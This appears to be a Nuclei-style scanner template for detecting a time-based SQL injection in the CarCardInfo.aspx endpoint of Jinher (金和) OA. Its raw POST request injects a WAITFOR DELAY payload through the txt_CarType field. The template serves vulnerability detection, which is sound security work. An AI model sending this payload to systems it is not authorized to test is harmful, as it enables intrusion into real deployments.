id: poc-yaml-jinher-carcardInfo-sqli
info:
  name: 金和OA CarCardInfo.aspx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template identifies SQL injection vulnerabilities in the CarCardInfo.aspx endpoint of 金和OA applications.

variables:
  t1: "{{rand_int(3,5)}}"
  t2: "{{to_number(t1) + 2}}"
  t3: "{{to_number(t2) + 5}}"
  t4: "{{rand_int(1,3)}}"
  t5: "{{to_number(t4) + 2}}"
  t6: "{{to_number(t5) + 3}}"

http:
  - raw:
      - |
        POST /c6/JHSoft.Web.Vehicle/CarCardInfo.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=%2FwEPDwUKMjAyNTc4NzA3NA8WAh4Ic3RyUXVlcnkFCWRlbGZsYWc9MBYCZg9kFgQCAg8PFgIeBFRleHQFBuafpeivomRkAgMPDxYMHglfUGFnZVNpemUCKB4PX1NvcnRBdHRyaWJ1dGVzMtgDAAEAAAD%2F%2F%2F%2F%%2F%2F%2F%2F%%2BPElEPjwvSUQ%2BPGl0ZW0gQ29sdW1uTmFtZT0n6L2m5Z6LJz48L2l0ZW0%2BPGl0ZW0gQ29sdW1uTmFtZT0n54mM54WnJz48L2l0ZW0%2BPC9yZWNvcmQ%2BPC9yb290PmRkZJju89%2Fcb0ViP%2BHqYZwpEbj%2BGmY0EecUW2zJyvdwmUng&txt_CarType=1');WAITFOR DELAY '0:0:{{t1}}'--&txt_CarCode=1&bt_Search=%B2%E9%D1%AF&__VIEWSTATEGENERATOR=0A1FC31B&__EVENTTARGET=&__EVENTARGUMENT=
